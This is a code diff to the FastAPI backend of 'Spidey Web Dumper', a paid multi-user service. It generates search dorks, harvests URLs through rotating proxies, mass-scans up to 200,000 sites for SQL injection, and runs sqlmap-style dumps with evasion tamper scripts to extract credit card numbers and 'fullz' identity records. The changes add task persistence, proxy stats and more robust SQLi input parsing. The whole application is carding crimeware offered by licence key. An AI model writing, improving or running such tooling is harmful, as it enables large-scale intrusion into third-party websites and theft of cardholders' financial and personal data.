@@ -1,7 +1,6 @@
 """
-Spidey Web Dumper — FastAPI Backend
-Full UI with 20+ pages, multi-user, live progress, proxy rotation
-+ 10 Levels of Security
+Spidey Web Dumper — FastAPI Backend (CLEAN v3.0)
+Saare fixes: SQLi scan, proxy check, cancel, toasts, disk persistence
 """
 import os
 import io
@@ -68,9 +67,10 @@ USERS_FILE        = os.path.join(DATA_DIR, "web_users.json")
 KEYS_FILE         = os.path.join(DATA_DIR, "web_keys.json")
 LAST_RESP_FILE    = os.path.join(DATA_DIR, "last_responses.json")
 FAILED_LOG_FILE   = os.path.join(DATA_DIR, "failed_logins.json")
+TASKS_FILE        = os.path.join(DATA_DIR, "active_tasks.json")
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  🛡️ SECURITY CONFIG — 10 LEVELS
+#  🛡️ SECURITY CONFIG
 # ═══════════════════════════════════════════════════════════════════════════
 ALLOWED_IPS_ENV = os.environ.get("ALLOWED_IPS", "").strip()
 ALLOWED_IPS = [ip.strip() for ip in ALLOWED_IPS_ENV.split(",") if ip.strip()]
@@ -101,20 +101,15 @@ app.mount("/static", StaticFiles(directory=STATIC_DIR), name="static")
 serializer = URLSafeTimedSerializer(SECRET_KEY)
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  TEMPLATE RENDER HELPER
+#  HELPERS
 # ═══════════════════════════════════════════════════════════════════════════
 def render(name: str, ctx: dict):
     if "request" not in ctx:
         raise ValueError(f"render() called without request for {name}")
     return templates.TemplateResponse(
-        request=ctx["request"],
-        name=name,
-        context=ctx,
+        request=ctx["request"], name=name, context=ctx,
     )
 
-# ═══════════════════════════════════════════════════════════════════════════
-#  JSON HELPERS
-# ═══════════════════════════════════════════════════════════════════════════
 def _load_json(path: str, default):
     try:
         with open(path, "r", encoding="utf-8") as f:
@@ -170,21 +165,17 @@ def record_failed_login(ip: str, username: str):
     FAILED_LOGINS[ip] += 1
     if FAILED_LOGINS[ip] >= 5:
         LOCKED_IPS[ip] = time.time() + LOCKOUT_DURATION
-        logger.warning(f"[SECURITY] IP locked out: {ip}")
+        logger.warning(f"[SECURITY] IP locked: {ip}")
     try:
         logs = _load_json(FAILED_LOG_FILE, [])
         if not isinstance(logs, list):
             logs = []
-        logs.append({
-            "timestamp": datetime.now().isoformat(),
-            "ip": ip, "username": username,
-            "attempts": FAILED_LOGINS[ip],
-        })
+        logs.append({"timestamp": datetime.now().isoformat(), "ip": ip, "username": username, "attempts": FAILED_LOGINS[ip]})
         if len(logs) > 500:
             logs = logs[-500:]
         _save_json(FAILED_LOG_FILE, logs)
-    except Exception as e:
-        logger.error(f"[SECURITY] Log fail: {e}")
+    except Exception:
+        pass
 
 def reset_failed_logins(ip: str):
     FAILED_LOGINS[ip] = 0
@@ -225,6 +216,7 @@ def load_users() -> dict:
             "usage": {"keywords": 0, "dorks": 0, "urls": 0, "sqli": 0, "dumps": 0, "cards": 0, "fullz": 0},
             "limits": {"keywords": 10**9, "dorks": 10**9, "urls": 10**9, "sqli": 10**9, "dumps": 10**9},
             "proxies": [],
+            "proxy_stats": {"live": 0, "dead": 0, "total": 0, "checked_at": None},
         }
         _save_json(USERS_FILE, d)
     return d
@@ -257,8 +249,7 @@ def save_keys(d: dict):
     _save_json(KEYS_FILE, d)
 
 def generate_license_key() -> str:
-    parts = ["".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(5))
-             for _ in range(4)]
+    parts = ["".join(secrets.choice(string.ascii_uppercase + string.digits) for _ in range(5)) for _ in range(4)]
     return "-".join(parts)
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -283,10 +274,40 @@ def get_last_response(uid: str, action: str = None) -> dict:
     return user_data
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  TASK SYSTEM
+#  TASK SYSTEM (with disk persistence)
 # ═══════════════════════════════════════════════════════════════════════════
 TASKS: Dict[str, dict] = {}
 TASKS_LOCK = asyncio.Lock()
+
+
+def load_tasks_from_disk():
+    global TASKS
+    try:
+        data = _load_json(TASKS_FILE, {})
+        if isinstance(data, dict):
+            TASKS.update(data)
+            logger.info(f"✅ Loaded {len(TASKS)} tasks from disk")
+    except Exception as e:
+        logger.error(f"Failed to load tasks: {e}")
+
+
+def save_tasks_to_disk():
+    try:
+        active = {}
+        now = datetime.now()
+        for tid, t in TASKS.items():
+            try:
+                started = datetime.fromisoformat(t.get("started", now.isoformat()))
+                age_hours = (now - started).total_seconds() / 3600
+                if t.get("status") in ("done", "error", "cancelled") and age_hours > 1:
+                    continue
+                active[tid] = t
+            except Exception:
+                active[tid] = t
+        _save_json(TASKS_FILE, active)
+    except Exception as e:
+        logger.error(f"save_tasks_to_disk: {e}")
+
 
 def new_task(uid: str, task_type: str, meta: dict = None) -> str:
     tid = secrets.token_urlsafe(12)
@@ -297,15 +318,21 @@ def new_task(uid: str, task_type: str, meta: dict = None) -> str:
                      "cards": 0, "fullz": 0, "msg": "Starting...", "log": []},
         "result": None, "error": None, "meta": meta or {},
     }
+    save_tasks_to_disk()
     return tid
+
 
 def update_task(tid: str, **kwargs):
     if tid in TASKS:
         TASKS[tid].update(kwargs)
+        save_tasks_to_disk()
+
 
 def update_progress(tid: str, **kwargs):
     if tid in TASKS:
         TASKS[tid]["progress"].update(kwargs)
+        save_tasks_to_disk()
+
 
 def add_log(tid: str, line: str, max_lines: int = 50):
     if tid in TASKS:
@@ -314,14 +341,17 @@ def add_log(tid: str, line: str, max_lines: int = 50):
         if len(logs) > max_lines:
             TASKS[tid]["progress"]["log"] = logs[-max_lines:]
 
+
 def get_task(tid: str) -> Optional[dict]:
     return TASKS.get(tid)
+
 
 def is_cancelled(tid: str) -> bool:
     t = TASKS.get(tid)
     return t is not None and t.get("status") == "cancelled"
 
-def cleanup_old_tasks(max_age_hours: int = 6):
+
+def cleanup_old_tasks(max_age_hours: int = 24):
     now = datetime.now()
     to_del = []
     for tid, t in TASKS.items():
@@ -333,6 +363,8 @@ def cleanup_old_tasks(max_age_hours: int = 6):
             to_del.append(tid)
     for tid in to_del:
         TASKS.pop(tid, None)
+    if to_del:
+        save_tasks_to_disk()
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  AUTH
@@ -426,6 +458,19 @@ def get_user_proxies(uid: str) -> List[str]:
         return []
     return user.get("proxies", [])
 
+def get_proxy_stats(uid: str) -> dict:
+    user = get_user(uid)
+    if not user:
+        return {"total": 0, "live": 0, "dead": 0, "checked_at": None}
+    proxies = user.get("proxies", [])
+    stats = user.get("proxy_stats", {})
+    return {
+        "total": len(proxies),
+        "live": stats.get("live", 0),
+        "dead": stats.get("dead", 0),
+        "checked_at": stats.get("checked_at"),
+    }
+
 def save_user_proxies(uid: str, proxies: List[str]):
     users = load_users()
     if uid not in users:
@@ -437,6 +482,16 @@ def save_user_proxies(uid: str, proxies: List[str]):
             seen.add(p)
             clean.append(p)
     users[uid]["proxies"] = clean
+    save_users(users)
+
+def save_proxy_stats(uid: str, live: int, dead: int, total: int):
+    users = load_users()
+    if uid not in users:
+        return
+    users[uid]["proxy_stats"] = {
+        "live": live, "dead": dead, "total": total,
+        "checked_at": datetime.now().isoformat(),
+    }
     save_users(users)
 
 def pick_proxy(uid: str) -> str:
@@ -497,7 +552,6 @@ async def login_page(request: Request, error: str = None, msg: str = None):
 async def login_submit(request: Request, username: str = Form(...), password: str = Form(...)):
     ip = get_client_ip(request)
     if not check_ip_whitelist(ip):
-        logger.warning(f"[SECURITY] Blocked IP: {ip}")
         return RedirectResponse("/login?error=Access+denied", status_code=302)
     allowed, seconds_left = check_lockout(ip)
     if not allowed:
@@ -526,14 +580,10 @@ async def login_submit(request: Request, username: str = Form(...), password: st
             pass
     token = create_session_token(username)
     fingerprint = make_fingerprint(request)
-    SESSIONS[token] = {
-        "uid": username, "fingerprint": fingerprint,
-        "last_active": time.time(), "ip": ip,
-    }
+    SESSIONS[token] = {"uid": username, "fingerprint": fingerprint, "last_active": time.time(), "ip": ip}
     reset_failed_logins(ip)
     resp = RedirectResponse("/dashboard", status_code=302)
-    resp.set_cookie("spidey_session", token, httponly=True,
-                    secure=True, max_age=SESSION_MAX_AGE, samesite="strict")
+    resp.set_cookie("spidey_session", token, httponly=True, secure=True, max_age=SESSION_MAX_AGE, samesite="strict")
     return resp
 
 @app.get("/logout")
@@ -595,7 +645,7 @@ async def redeem_submit(request: Request, license_key: str = Form(...)):
     return RedirectResponse("/dashboard?msg=Plan+activated", status_code=302)
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  ROUTES — DASHBOARD & PAGES
+#  ROUTES — PAGES
 # ═══════════════════════════════════════════════════════════════════════════
 @app.get("/dashboard", response_class=HTMLResponse)
 async def dashboard(request: Request, msg: str = None, error: str = None):
@@ -611,7 +661,7 @@ async def dashboard(request: Request, msg: str = None, error: str = None):
         "fullz": user.get("usage", {}).get("fullz", 0),
     }
     limits = user.get("limits", {})
-    proxies = user.get("proxies", [])
+    proxy_stats = get_proxy_stats(uid)
     expires = user.get("expires")
     expiry_str = "Unlimited" if user.get("is_admin") else "N/A"
     if expires:
@@ -627,7 +677,8 @@ async def dashboard(request: Request, msg: str = None, error: str = None):
     last = get_last_response(uid)
     return render("dashboard.html", {
         "request": request, "uid": uid, "user": user, "stats": stats,
-        "limits": limits, "proxies_count": len(proxies),
+        "limits": limits, "proxies_count": proxy_stats["total"],
+        "proxy_stats": proxy_stats,
         "expiry_str": expiry_str, "is_admin": user.get("is_admin", False),
         "plan_label": user.get("plan_label", "Free Trial"),
         "last": last, "msg": msg, "error": error,
@@ -637,33 +688,27 @@ async def dashboard(request: Request, msg: str = None, error: str = None):
 @app.get("/keywords", response_class=HTMLResponse)
 async def keywords_page(request: Request):
     uid = require_user(request)
-    return render("keywords.html", {"request": request, "uid": uid,
-                                     "last": get_last_response(uid, "keywords")})
+    return render("keywords.html", {"request": request, "uid": uid, "last": get_last_response(uid, "keywords")})
 
 @app.get("/dorks", response_class=HTMLResponse)
 async def dorks_page(request: Request):
     uid = require_user(request)
-    return render("dorks.html", {"request": request, "uid": uid,
-                                  "last": get_last_response(uid, "dorks")})
+    return render("dorks.html", {"request": request, "uid": uid, "last": get_last_response(uid, "dorks")})
 
 @app.get("/parser", response_class=HTMLResponse)
 async def parser_page(request: Request):
     uid = require_user(request)
-    return render("parser.html", {"request": request, "uid": uid,
-                                   "last": get_last_response(uid, "parser"),
-                                   "proxies_count": len(get_user_proxies(uid))})
+    return render("parser.html", {"request": request, "uid": uid, "last": get_last_response(uid, "parser"), "proxies_count": len(get_user_proxies(uid))})
 
 @app.get("/sqli", response_class=HTMLResponse)
 async def sqli_page(request: Request):
     uid = require_user(request)
-    return render("sqli.html", {"request": request, "uid": uid,
-                                 "last": get_last_response(uid, "sqli")})
+    return render("sqli.html", {"request": request, "uid": uid, "last": get_last_response(uid, "sqli")})
 
 @app.get("/dump", response_class=HTMLResponse)
 async def dump_page(request: Request):
     uid = require_user(request)
-    return render("dump.html", {"request": request, "uid": uid,
-                                 "last": get_last_response(uid, "dump")})
+    return render("dump.html", {"request": request, "uid": uid, "last": get_last_response(uid, "dump")})
 
 @app.get("/files", response_class=HTMLResponse)
 async def files_page(request: Request):
@@ -678,8 +723,8 @@ async def files_page(request: Request):
 async def proxy_page(request: Request):
     uid = require_user(request)
     proxies = get_user_proxies(uid)
-    return render("proxy.html", {"request": request, "uid": uid,
-                                  "proxies": proxies, "count": len(proxies)})
+    stats = get_proxy_stats(uid)
+    return render("proxy.html", {"request": request, "uid": uid, "proxies": proxies, "count": len(proxies), "proxy_stats": stats})
 
 @app.get("/settings", response_class=HTMLResponse)
 async def settings_page(request: Request):
@@ -687,17 +732,14 @@ async def settings_page(request: Request):
     user = get_user(uid)
     return render("settings.html", {
         "request": request, "uid": uid, "user": user,
-        "sqlmap_defaults": {"level": 3, "risk": 2, "threads": 10,
-                            "technique": "BEUSTQ",
-                            "tamper": "space2comment,between,charencode", "crawl": 0},
+        "sqlmap_defaults": {"level": 3, "risk": 2, "threads": 10, "technique": "BEUSTQ", "tamper": "space2comment,between,charencode", "crawl": 0},
     })
 
 @app.get("/profile", response_class=HTMLResponse)
 async def profile_page(request: Request):
     uid = require_user(request)
     user = get_user(uid)
-    return render("profile.html", {"request": request, "uid": uid,
-                                    "user": user, "last": get_last_response(uid)})
+    return render("profile.html", {"request": request, "uid": uid, "user": user, "last": get_last_response(uid)})
 
 @app.get("/plans", response_class=HTMLResponse)
 async def plans_page(request: Request):
@@ -737,6 +779,7 @@ async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
     try:
         update_task(tid, status="running")
         update_progress(tid, msg=f"Generating {count} keywords...", total=count)
+        add_log(tid, f"Generating {count} keywords")
         from core.generators import generate_keywords
         loop = asyncio.get_running_loop()
         kws = await loop.run_in_executor(None, generate_keywords, seeds, count)
@@ -746,7 +789,8 @@ async def _run_keywords(tid: str, uid: str, seeds: List[str], count: int):
         consume_quota(uid, "keywords", len(kws))
         save_last_response(uid, "keywords", {"count": len(kws), "file": fname, "seeds": seeds[:5]})
         update_task(tid, status="done", result={"count": len(kws), "file": fname})
-        update_progress(tid, done=len(kws), total=len(kws), msg="Done!")
+        update_progress(tid, done=len(kws), total=len(kws), msg="✅ Done!")
+        add_log(tid, f"✅ Generated {len(kws)} keywords")
     except Exception as e:
         logger.exception(f"[keywords] {e}")
         update_task(tid, status="error", error=str(e))
@@ -793,7 +837,7 @@ async def _run_dorks(tid: str, uid: str, kws: List[str], count: int, dtype: str)
         consume_quota(uid, "dorks", len(dorks))
         save_last_response(uid, "dorks", {"count": len(dorks), "type": dtype, "file": fname})
         update_task(tid, status="done", result={"count": len(dorks), "file": fname, "type": dtype})
-        update_progress(tid, done=len(dorks), total=len(dorks), msg="Done!")
+        update_progress(tid, done=len(dorks), total=len(dorks), msg="✅ Done!")
     except Exception as e:
         logger.exception(f"[dorks] {e}")
         update_task(tid, status="error", error=str(e))
@@ -826,17 +870,14 @@ async def _run_parser(tid: str, uid: str, dorks: List[str]):
             if now - last_edit[0] < 1.5:
                 return
             last_edit[0] = now
-            update_progress(tid, done=done, total=total, found=found,
-                            msg=f"Scanned {done}/{total} | Found {found} URLs")
-        urls = await search_urls_from_dorks(dorks, limit=200_000,
-                                             progress_callback=on_prog,
-                                             proxy_list=proxies)
+            update_progress(tid, done=done, total=total, found=found, msg=f"Scanned {done}/{total} | Found {found}")
+        urls = await search_urls_from_dorks(dorks, limit=200_000, progress_callback=on_prog, proxy_list=proxies)
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"urls_{len(urls)}_{ts}.txt", "\n".join(urls))
         consume_quota(uid, "urls", len(urls))
         save_last_response(uid, "parser", {"dorks": len(dorks), "urls": len(urls), "file": fname})
         update_task(tid, status="done", result={"dorks": len(dorks), "urls": len(urls), "file": fname})
-        update_progress(tid, done=len(dorks), total=len(dorks), found=len(urls), msg="Done!")
+        update_progress(tid, done=len(dorks), total=len(dorks), found=len(urls), msg="✅ Done!")
     except Exception as e:
         logger.exception(f"[parser] {e}")
         update_task(tid, status="error", error=str(e))
@@ -901,26 +942,26 @@ async def api_proxy_check(request: Request):
 
 async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
     try:
+        total = len(proxies)
         update_task(tid, status="running")
-        update_progress(tid, total=len(proxies), msg="Checking proxies...")
+        update_progress(tid, total=total, msg=f"Checking {total} proxies...")
+        add_log(tid, f"Checking {total} proxies")
         from core.proxy import check_proxies_bulk
-        last_edit = [0.0]
-        async def on_prog(done, total, live):
+        last_edit = [time.time()]
+        async def on_prog(done, tot, live):
             now = time.time()
-            if now - last_edit[0] < 1.2:
+            if now - last_edit[0] < 1.0:
                 return
             last_edit[0] = now
-            update_progress(tid, done=done, total=total, live=live,
-                            msg=f"Checked {done}/{total} | Live {live}")
-        live_list = await check_proxies_bulk(proxies, timeout=8.0,
-                                               concurrency=200, progress_callback=on_prog)
+            update_progress(tid, done=done, total=tot, live=live, msg=f"Checked {done}/{tot} | Live {live}")
+        live_list = await check_proxies_bulk(proxies, timeout=5.0, concurrency=200, progress_callback=on_prog)
+        dead_count = len(proxies) - len(live_list)
         save_user_proxies(uid, live_list)
-        save_last_response(uid, "proxy_check", {"checked": len(proxies), "live": len(live_list)})
-        update_task(tid, status="done", result={"checked": len(proxies),
-                                                  "live": len(live_list),
-                                                  "dead": len(proxies) - len(live_list)})
-        update_progress(tid, done=len(proxies), total=len(proxies),
-                        live=len(live_list), msg="Done!")
+        save_proxy_stats(uid, live=len(live_list), dead=dead_count, total=total)
+        save_last_response(uid, "proxy_check", {"checked": len(proxies), "live": len(live_list), "dead": dead_count})
+        update_task(tid, status="done", result={"checked": len(proxies), "live": len(live_list), "dead": dead_count})
+        update_progress(tid, done=total, total=total, live=len(live_list), msg="✅ Done!")
+        add_log(tid, f"✅ Live: {len(live_list)}/{total}")
     except Exception as e:
         logger.exception(f"[proxy_check] {e}")
         update_task(tid, status="error", error=str(e))
@@ -929,6 +970,7 @@ async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
 async def api_proxy_clear(request: Request):
     uid = require_user(request)
     save_user_proxies(uid, [])
+    save_proxy_stats(uid, 0, 0, 0)
     return {"ok": True, "total": 0}
 
 @app.post("/api/proxy/remove")
@@ -945,38 +987,89 @@ async def api_proxy_remove(request: Request, proxies: str = Form(...)):
 async def api_proxy_list(request: Request):
     uid = require_user(request)
     proxies = get_user_proxies(uid)
-    return {"ok": True, "proxies": proxies, "count": len(proxies)}
+    stats = get_proxy_stats(uid)
+    return {"ok": True, "proxies": proxies, "count": len(proxies), "stats": stats}
+
+@app.get("/api/proxy/stats")
+async def api_proxy_stats(request: Request):
+    uid = require_user(request)
+    return get_proxy_stats(uid)
 
 # ═══════════════════════════════════════════════════════════════════════════
-#  API — SQLI
+#  API — SQLI (MAIN FIX HERE)
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/sqli/scan")
 async def api_sqli_scan(request: Request, urls: str = Form(...)):
     uid = require_user(request)
-    url_list = [u.strip() for u in urls.splitlines() if u.strip().startswith(("http://", "https://"))]
+    
+    # ✅ ROBUST PARSING
+    raw = urls.replace("\r\n", "\n").replace("\r", "\n")
+    raw_lines = raw.split("\n")
+    
+    url_list = []
+    for line in raw_lines:
+        u = line.strip().strip("\ufeff").strip()
+        if not u:
+            continue
+        if not u.startswith(("http://", "https://")):
+            if u.startswith(("www.", "http:/", "https:/")):
+                if not u.startswith("http"):
+                    u = "https://" + u.lstrip("/")
+            else:
+                continue
+        url_list.append(u)
+    
+    # Dedupe
+    seen = set()
+    unique = []
+    for u in url_list:
+        if u not in seen:
+            seen.add(u)
+            unique.append(u)
+    url_list = unique
+    
+    logger.info(f"[sqli] {len(raw_lines)} lines → {len(url_list)} valid URLs")
+    
     if not url_list:
-        return JSONResponse({"error": "No valid URLs"}, status_code=400)
+        return JSONResponse({"error": f"No valid URLs. Got {len(raw_lines)} lines"}, status_code=400)
+    
     if len(url_list) > 200_000:
         url_list = url_list[:200_000]
+    
     allowed, remaining = check_quota(uid, "sqli", len(url_list))
     if not allowed:
         return JSONResponse({"error": f"Quota exceeded. Remaining: {remaining}"}, status_code=429)
+    
     tid = new_task(uid, "sqli", {"total": len(url_list)})
-    asyncio.create_task(_run_sqli(tid, uid, url_list))
-    return {"task_id": tid}
+    logger.info(f"[sqli] Task {tid} created with {len(url_list)} URLs")
+    
+    task = asyncio.create_task(_run_sqli(tid, uid, url_list))
+    
+    def _on_done(t):
+        try:
+            t.result()
+        except Exception as e:
+            logger.exception(f"[sqli] Task {tid} crashed")
+            update_task(tid, status="error", error=f"Crash: {str(e)[:200]}")
+    
+    task.add_done_callback(_on_done)
+    return {"task_id": tid, "total": len(url_list)}
+
 
 async def _run_sqli(tid: str, uid: str, urls: List[str]):
-    """🎯 FIXED SQLi Scanner — Fast, no hang"""
+    """🎯 CLEAN SQLi Scanner"""
     try:
         total = len(urls)
+        logger.info(f"[sqli:{tid}] STARTED with {total} URLs")
+        
         update_task(tid, status="running")
         update_progress(tid, done=0, total=total, found=0, msg=f"Scanning {total} URLs...")
         add_log(tid, f"Testing {total} URLs")
 
         proxies = get_user_proxies(uid)
         add_log(tid, f"Using {len(proxies)} proxies")
+        logger.info(f"[sqli:{tid}] Proxies: {len(proxies)}")
 
-        # ✅ STEP 1: Filter live proxies (agar 5+ hain)
         if len(proxies) >= 5:
             add_log(tid, "⚡ Filtering live proxies...")
             update_progress(tid, msg="Filtering live proxies...")
@@ -985,46 +1078,40 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
                 live = await check_proxies_bulk(proxies, timeout=5.0, concurrency=300)
                 add_log(tid, f"✅ Live: {len(live)}/{len(proxies)}")
                 proxies = live if live else []
-                if not proxies:
-                    add_log(tid, "⚠️ No live proxies — running direct")
             except Exception as e:
+                logger.exception(f"[sqli:{tid}] Proxy filter failed")
                 add_log(tid, f"⚠️ Filter failed: {str(e)[:60]}")
                 proxies = []
 
-        add_log(tid, f"Starting scan with {len(proxies)} proxies")
+        if not proxies:
+            add_log(tid, "⚠️ No proxies — running direct")
 
-        # ✅ STEP 2: Use check_urls_bulk (NOT _check_injectable)
         from core.sqli import check_urls_bulk
         last_edit = [time.time()]
         
-        async def on_prog(done, total, found):
+        async def on_prog(done, tot, found):
             if is_cancelled(tid):
                 return
             now = time.time()
             if now - last_edit[0] >= 1.0:
                 last_edit[0] = now
-                update_progress(
-                    tid, done=done, total=total, found=found,
-                    msg=f"Tested {done}/{total} | VULN {found}",
-                )
+                update_progress(tid, done=done, total=tot, found=found, msg=f"Tested {done}/{tot} | VULN {found}")
         
         update_progress(tid, msg=f"Scanning {total} URLs...")
+        logger.info(f"[sqli:{tid}] Calling check_urls_bulk...")
         
         inj = await check_urls_bulk(
-            urls,
-            proxies=proxies,
-            concurrency=80,
-            timeout=6.0,
-            progress_callback=on_prog,
-            task_id=tid,
+            urls, proxies=proxies, concurrency=80, timeout=6.0,
+            progress_callback=on_prog, task_id=tid,
         )
-
+        
+        logger.info(f"[sqli:{tid}] Returned {len(inj)} vulnerable")
+        
         if is_cancelled(tid):
             add_log(tid, "⛔ Cancelled")
             update_progress(tid, msg="⛔ Cancelled")
             return
-
-        # ✅ Save results
+        
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         fname = save_output(uid, f"vuln_{len(inj)}_{ts}.txt", "\n".join(inj))
         consume_quota(uid, "sqli", total)
@@ -1032,13 +1119,14 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
         update_task(tid, status="done", result={"tested": total, "vuln": len(inj), "file": fname})
         update_progress(tid, done=total, total=total, found=len(inj), msg="✅ Done!")
         add_log(tid, f"✅ Found {len(inj)} vulnerable URLs")
+        logger.info(f"[sqli:{tid}] DONE — {len(inj)} vulns")
     except asyncio.CancelledError:
         add_log(tid, "⛔ Cancelled")
         update_progress(tid, msg="⛔ Cancelled")
     except Exception as e:
-        logger.exception(f"[sqli] {e}")
+        logger.exception(f"[sqli:{tid}] ERROR")
         update_task(tid, status="error", error=str(e))
-        add_log(tid, f"❌ Error: {str(e)[:100]}")
+        add_log(tid, f"❌ Error: {str(e)[:200]}")
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  API — DUMP
@@ -1066,11 +1154,6 @@ async def api_dump_run(request: Request, urls: str = Form(...), level: int = For
     asyncio.create_task(_run_dump(tid, uid, url_list, level, risk, threads, technique, tamper, crawl))
     return {"task_id": tid}
 
-
-
-
-        
-        
 async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, crawl):
     try:
         update_task(tid, status="running")
@@ -1085,9 +1168,7 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
             now = time.time()
             if now - last_edit[0] < 1.5: return
             last_edit[0] = now
-            update_progress(tid, done=done, total=total, cards=len(all_cards),
-                            fullz=len(all_fullz),
-                            msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}")
+            update_progress(tid, done=done, total=total, cards=len(all_cards), fullz=len(all_fullz), msg=f"Dumped {done}/{total} | CC {len(all_cards)} | Fullz {len(all_fullz)}")
         async def on_result(r, zip_bytes):
             if r.cards:
                 for c in r.cards: all_cards.add(c)
@@ -1098,11 +1179,7 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
                     if recs: all_fullz.extend(recs)
             except Exception: pass
             add_log(tid, f"✅ {r.url[:60]} | CC: {len(r.cards)}")
-        await api_dump_multiple(
-            urls, proxy_list=proxies, level=level, risk=risk,
-            technique=technique, threads=threads, tamper=tamper,
-            crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
-        )
+        await api_dump_multiple(urls, proxy_list=proxies, level=level, risk=risk, technique=technique, threads=threads, tamper=tamper, crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result)
         all_cards = list(all_cards)
         ts = datetime.now().strftime("%d%m%y_%H%M%S")
         result = {}
@@ -1119,22 +1196,14 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
                 seen.add(key); dedup.append(rec)
             rich = [r for r in dedup if r.holder_name or r.address or r.zip or r.email or r.phone]
             if rich:
-                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt",
-                                      "\n".join(fullz_records_to_lines(rich, "full")))
+                fz_name = save_output(uid, f"fullz_{len(rich)}_{ts}.txt", "\n".join(fullz_records_to_lines(rich, "full")))
                 result["fullz_file"] = fz_name
                 result["fullz"] = len(rich)
                 consume_quota(uid, "fullz", len(rich))
         consume_quota(uid, "dumps", len(urls))
-        save_last_response(uid, "dump", {
-            "tested": len(urls), "cards": result.get("cards", 0),
-            "fullz": result.get("fullz", 0),
-            "cards_file": result.get("cards_file", ""),
-            "fullz_file": result.get("fullz_file", ""),
-        })
+        save_last_response(uid, "dump", {"tested": len(urls), "cards": result.get("cards", 0), "fullz": result.get("fullz", 0), "cards_file": result.get("cards_file", ""), "fullz_file": result.get("fullz_file", "")})
         update_task(tid, status="done", result=result)
-        update_progress(tid, done=len(urls), total=len(urls),
-                        cards=result.get("cards", 0),
-                        fullz=result.get("fullz", 0), msg="Done!")
+        update_progress(tid, done=len(urls), total=len(urls), cards=result.get("cards", 0), fullz=result.get("fullz", 0), msg="✅ Done!")
     except Exception as e:
         logger.exception(f"[dump] {e}")
         update_task(tid, status="error", error=str(e))
@@ -1160,7 +1229,9 @@ async def api_task_cancel(request: Request, tid: str):
     t = get_task(tid)
     if not t or t["uid"] != uid:
         raise HTTPException(status_code=404, detail="Task not found")
-    update_task(tid, status="cancelled")
+    update_task(tid, status="cancelled", error="Cancelled by user")
+    update_progress(tid, msg="⛔ Cancelled")
+    add_log(tid, "⛔ Cancelled by user")
     return {"ok": True}
 
 @app.get("/api/tasks/active")
@@ -1170,6 +1241,16 @@ async def api_tasks_active(request: Request):
         if t["uid"] == uid and t["status"] in ("starting", "running"):
             return {"task_id": tid, "task": t}
     return {"task_id": None}
+
+@app.get("/api/tasks/recent")
+async def api_tasks_recent(request: Request):
+    uid = require_user(request)
+    user_tasks = [
+        {"id": t["id"], "type": t["type"], "status": t["status"], "started": t["started"], "progress": t["progress"]}
+        for t in TASKS.values() if t["uid"] == uid
+    ]
+    user_tasks.sort(key=lambda x: x["started"], reverse=True)
+    return {"tasks": user_tasks[:20]}
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  DOWNLOAD / FILES
@@ -1207,8 +1288,7 @@ async def api_files_delete(request: Request, fname: str = Form(...)):
 #  SETTINGS
 # ═══════════════════════════════════════════════════════════════════════════
 @app.post("/api/settings/password")
-async def api_settings_password(request: Request, old_password: str = Form(...),
-                                 new_password: str = Form(...)):
+async def api_settings_password(request: Request, old_password: str = Form(...), new_password: str = Form(...)):
     uid = require_user(request)
     users = load_users()
     if uid not in users:
@@ -1230,21 +1310,15 @@ async def admin_panel(request: Request):
     uid = require_admin(request)
     users = load_users()
     keys = load_keys()
-    active_users = sum(1 for u in users.values()
-                       if u.get("expires") and u.get("expires") > datetime.now().isoformat())
-    return render("admin.html", {
-        "request": request, "uid": uid,
-        "total_users": len(users), "active_users": active_users,
-        "total_keys": len(keys), "plans": PLANS,
-    })
+    active_users = sum(1 for u in users.values() if u.get("expires") and u.get("expires") > datetime.now().isoformat())
+    return render("admin.html", {"request": request, "uid": uid, "total_users": len(users), "active_users": active_users, "total_keys": len(keys), "plans": PLANS})
 
 @app.get(ADMIN_PATH + "/keys", response_class=HTMLResponse)
 async def admin_keys(request: Request, msg: str = None):
     uid = require_admin(request)
     keys = load_keys()
     items = sorted(keys.items(), key=lambda x: x[1].get("created", ""), reverse=True)
-    return render("admin_keys.html", {"request": request, "uid": uid,
-                                       "keys": items, "msg": msg, "plans": PLANS})
+    return render("admin_keys.html", {"request": request, "uid": uid, "keys": items, "msg": msg, "plans": PLANS})
 
 @app.post(ADMIN_PATH + "/keys/generate")
 async def admin_keys_generate(request: Request, plan: str = Form(...), count: int = Form(1)):
@@ -1256,9 +1330,7 @@ async def admin_keys_generate(request: Request, plan: str = Form(...), count: in
     for _ in range(count):
         k = generate_license_key()
         while k in keys: k = generate_license_key()
-        keys[k] = {"plan": plan, "label": PLANS[plan]["label"],
-                   "created": datetime.now().isoformat(),
-                   "created_by": uid, "used_by": None}
+        keys[k] = {"plan": plan, "label": PLANS[plan]["label"], "created": datetime.now().isoformat(), "created_by": uid, "used_by": None}
     save_keys(keys)
     return RedirectResponse(f"{ADMIN_PATH}/keys?msg=Generated+{count}+keys", status_code=302)
 
@@ -1276,8 +1348,7 @@ async def admin_users(request: Request, msg: str = None):
     uid = require_admin(request)
     users = load_users()
     items = sorted(users.items(), key=lambda x: x[1].get("created", ""), reverse=True)
-    return render("admin_users.html", {"request": request, "uid": uid,
